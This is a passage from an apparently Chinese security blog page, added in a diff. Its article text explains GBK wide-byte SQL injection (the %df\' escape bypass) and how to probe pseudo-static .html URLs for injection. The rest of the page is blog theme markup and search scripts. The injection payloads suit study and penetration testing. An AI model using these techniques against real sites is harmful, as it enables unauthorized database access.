+<p>其原理是mysql_query(“SETNAMES ‘gbk’”,$conn)语句将编码字符集修改为gbk，此时，%df\’对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\”就被吃调了，从而转义消毒失败。</p>
+<p>从宽字节注入漏洞原理可以看出，宽字节注入的关键点有两个：</p>
+<p>（1）          设置宽字节字符集；</p>
+<p>（2）          设置的宽字符集可能吃掉转义符号“\”（对应的编码为0x5c，即低位中包含正常的0x5c就行了）。</p>
+<p>0x11 伪静态SQL注入</p>
+<p>伪静态，主要是为了隐藏传递的参数名，伪静态只是一种URL重写的手段，既然能接受参数输入，所以并不能防止注入。</p>
+<p>如果看到一个以.html或者.htm结尾的网页，此时可以通过呢在在地址输入框中输入：</p>
+<p>javascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。</p>
+<p>在平时的测试过程中我们经常会看到这样一类奇特的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx:xxx/test.php/id/1.html   （原型一般为：http://xxx.xxx.xx.xx:xxx/test.php?id=1   ）</span><br></pre></td></tr></table></figure>
+<p>像上面这种类型的网址URL，往往是一种伪静态网页，遇到这种情况可以直接对”.html”之前的参数加“’”进行判断是否存在注入！</p>
+<p>接着就是在注入点进行各种注入测试了。</p>
+
+				</div>
+			</div>
+
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/09/17/2018.10.17/" title="VulnHub-LazySysAdmin 过关笔记">
+			下一篇&raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+			
+
+
+	</div> 
+</div>
+
+<!-- code highlight 测试版fix me-->
+<style>
+pre {
+  background: inherit;
+  border: 1px solid #ccc;
+  overflow-x: auto;
+  padding: .5em;
+  position: relative;
+  margin: 0 0 0.8em 0;
+  overflow-y: hidden
+}
+
+pre code {
+  margin: -0.5em !important;
+  padding: 0.5em !important;
+  overflow-y: auto;
+  overflow-x: auto;
+  display: block
+}
+
+code.has-numbering {
+  margin-left: 1.7em !important;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 2.2em;
+  height: 100%;
+  padding: 0.5em 0.2em 0.5em 0;
+  border-right: 1px solid #C3CCD0;
+  background-color: #EEE;
+  text-align: right;
+  color: #AAA;
+  list-style: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none
+}
+</style>
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+
+<!-- css爬取自网页 -->
+<!-- code highlight 测试版fix me-->
+
+
+		</div>
+		<footer>
+	<div class="blog-text-center">
+		<div class="social">
+				
+				
+					<a href="http://github.com/" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Weibo" target="_blank"><i class="fa fa-weibo"></i>&nbsp;</a>
+				
+				
+					<a href="http://github.com/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="QQ" target="_blank"><i class="fa fa-qq"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Twitter" target="_blank"><i class="fa fa-twitter"></i>&nbsp;</a>
+						
+				
+		</div>
+	</div>
+
+	<div  class="blog-text-center">
+		<div class="copyright">
+			
+				&copy; 2017 - 2018, content by vint. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+
+
+
+
+
+
+		</main>
+
+		
+
+<script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script>
+
+<script>window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')</script>
+
+<script src="/js/main.js"></script> 
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 60px 20px 0 20px;
+		line-height: 1.4;
+		font-family: 'Fang Song', 'Song', 'STSong', sans-serif;
+		text-align: center;
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script>
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+    <div class="popup search-popup local-search-popup">
+    <span class="popup-btn-close">
+      ESC
+    </span>
+    <div class="container">
+      <div class="col-md-8 col-md-offset-2">
+
+        <div class="local-search-header clearfix">
+            <span class="search-icon"></span>
+            <div class="local-search-input-wrapper">
+              <input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+            </div>
+        </div>
+
+        <div id="local-search-result"></div>
+
+      </div>
+    </div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // get search zip version
+    $.get('/searchVersion.txt?t=' + (+new Date()), function(res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson () {
+      initLoad(['/search.zip'], {
+        loadOptions: {
+          success: function(obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function(e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions:{
+          'json':'application/json'
+        }
+      })
+    }
+
+    // search function;
+    var searchFunc = function(search_id, content_id) {
+      'use strict';
+
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function() {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function(data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title ? data.title.trim() : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content ? data.content.trim().replace(/<[^>]+>/g,"") : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function(keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0, position = [], index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+
+            // show search results
+
+            if (isMatch) {
+              // sort index by position of keyword
+
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+
+              // merge hits into slices
+
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+
+                  // move to next position of hit
+
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {
+                  hits: hits,
+                  start: start,
+                  end: end,
+                  searchTextCount: searchTextCountInSlice
+                };
+              }
+
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if(start < 0){
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if(end > content.length){
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+
+              // sort slices in content by search text's count and hits' count
+
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+
+              // select top N slices in content
+
+              var upperBound = parseInt('2');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+
+              // highlight title and content
+
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+
+              var resultItem = '';
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+              } else {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+              }
+
+              slicesOfContent.forEach(function (slice) {
+                resultItem +=  "<p class=\"search-result\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+
+              resultItem += "</li>";
+              resultItems.push({
+                item: resultItem,
+                searchTextCount: searchTextCount,
+                hitCount: hitCount,
+                id: resultItems.length
+              });
+            }
+          })
+        };
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /> no result </div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<ul class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</ul>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+
+      // remove loading animation
+      $('body').css('overflow', '');
+
+      proceedsearch();
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        $('.sb-close').click();
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+
+<script src="/js/code.js"></script>
+
+
+	</body>
+	</html>
+
+
+
